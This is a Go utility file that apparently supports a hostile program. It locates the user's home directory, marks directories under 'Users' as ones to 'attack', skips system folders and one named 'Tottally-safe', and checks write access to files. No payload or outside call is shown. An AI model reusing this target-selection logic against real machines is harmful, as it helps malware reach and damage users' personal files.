package Utils

import (
	"log"
	"os"
	"runtime"
	"strings"
	"syscall"
)

//we will try to match for files to check whether they contain any of the key words

// check current dir
func GetCurrentDir() string {
	dir, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}
	var separator string
	if runtime.GOOS == "windows" {
		separator = `\`
	} else {
		separator = `/`
	}
	names := strings.SplitAfter(dir, separator)
	for _, name := range names {

		if strings.Contains(name, "usr") {
			return separator + name
		}
		if strings.Contains(name, "Users") {
			return separator + name
		}
	}
	return "/"
}

// current file name totally safe
func SkipDir(dirName string) bool {
	var separator string
	if runtime.GOOS == "windows" {
		separator = `\`
	} else {
		separator = `/`
	}
	names := strings.SplitAfter(dirName, separator)
	for _, name := range names {
		if strings.Contains(name, "Tottally-safe") {
			return true
		}
		if strings.Contains(name, "bin") {
			return true
		}
		if strings.Contains(name, "dev") {
			return true
		}
	}
	return false
}

func AttackDir(dirName string) bool {
	var separator string
	if runtime.GOOS == "windows" {
		separator = `\`
	} else {
		separator = `/`
	}
	names := strings.SplitAfter(dirName, separator)
	for _, name := range names {
		if strings.Contains(name, "usr") {
			return false
		}
		if strings.Contains(name, "Users") {
			return true
		}
	}
	return false
}

func CanAccess(path string) bool {
	fileInfo, err := os.Stat(path)
	if err != nil {
		log.Printf("Error getting file info: %v", err)
		return false
	}

	mode := fileInfo.Mode()
	if mode.IsDir() {
		return checkDirPermissions(path)
	}

	if mode.IsRegular() {
		return checkFilePermissions(path)
	}

	return false
}

func checkDirPermissions(path string) bool {
	fileInfo, err := os.Stat(path)
	if err != nil {
		return false
	}

	// Check write permission for the directory
	if fileInfo.IsDir() {
		err = syscall.Access(path, syscall.O_RDWR)
		if err != nil {
			return false
		}
	}

	return true
}

func checkFilePermissions(path string) bool {
	fileInfo, err := os.Stat(path)
	if err != nil {
		return false
	}

	// Check write permission for the file
	if fileInfo.Mode().IsRegular() {
		err = syscall.Access(path, syscall.O_RDWR)
		if err != nil {
			return false
		}
	}

	return true
}
